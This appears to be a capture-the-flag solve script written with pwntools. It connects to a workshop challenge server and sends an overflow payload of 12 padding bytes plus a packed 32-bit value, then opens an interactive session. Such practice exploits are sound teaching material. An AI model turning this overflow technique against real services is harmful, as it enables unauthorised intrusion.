from pwn import *

p = remote("ctfworkshop.cybr.club", "3002")

p.sendline(b'A' * 12 + p32(0x563412))
p.interactive()
